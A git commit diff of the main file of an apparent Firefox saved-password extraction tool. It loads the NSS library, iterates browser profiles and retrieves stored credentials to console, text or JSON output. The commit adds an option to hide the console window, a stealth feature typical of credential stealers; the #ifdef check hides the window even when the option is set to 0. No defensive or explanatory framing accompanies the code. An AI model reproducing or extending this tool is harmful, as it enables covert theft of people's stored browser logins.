bf74161fd25a134bad35e91fa515aa5ffc524eee
zedek <ethan168861@gmail.com>
2022-12-27 12:40:31 +1000

    Cleaned up

--- src/main.cxx
+++ src/main.cxx
@@ -1,29 +1,27 @@
 #include "ffbt.hxx"
 
-#define OUTPUT_TYPE 0
-// 0:console only, 1:.txt file, 2:json file
+#define HIDE_CONSOLE 0 /* 0=NO 1=YES */
+#define OUTPUT_TYPE 0 /* 0=console 1=txt 2=json */
 
 int main()
 {
+    #ifdef HIDE_CONSOLE
+        ShowWindow(GetConsoleWindow(), SW_HIDE);
+    #endif
+
     std::filesystem::path nss_dir = get_nss_location();
     std::vector<std::filesystem::path> valid_profiles = get_valid_profiles();
-    if (valid_profiles.empty()) {
-        std::cout << "Could not find a valid profile... Exiting\n";
-        return 0;
-    }
 
     FFBT ffbt;
-    int status;
-    
-    status = ffbt.Load_NSS(nss_dir);
-    if (status!=0) { ffbt.NSS_KILL(); return 0; }
+    if (ffbt.Load_NSS(nss_dir) != 0) { ffbt.NSS_KILL(); return 0; }
     
     for (auto profile = begin(valid_profiles); profile != end(valid_profiles); ++profile)
     {
-        status = ffbt.Initialize_Profile(*profile); if (status!=0) { std::cerr << "Exiting\n"; ffbt.NSS_KILL(); return 0; }
-        status = ffbt.Check_Authentication();       if (status!=0) { std::cerr << "Exiting\n"; ffbt.NSS_KILL(); return 0; }
-        status = ffbt.retrieve_credentials(*profile, OUTPUT_TYPE);    if (status!=0) { std::cerr << "Exiting\n"; ffbt.NSS_KILL(); return 0; }
+        if ( ffbt.Initialize_Profile(*profile)                != 0 ) { std::cerr << "\nAn Error Occurred. Exiting\n"; ffbt.NSS_KILL(); return 0; }
+        if ( ffbt.Check_Authentication()                      != 0 ) { std::cerr << "\nAn Error Occurred. Exiting\n"; ffbt.NSS_KILL(); return 0; }
+        if ( ffbt.retrieve_credentials(*profile, OUTPUT_TYPE) != 0 ) { std::cerr << "\nAn Error Occurred. Exiting\n"; ffbt.NSS_KILL(); return 0; }
     }
+
     ffbt.NSS_KILL();
     return 0;
 }
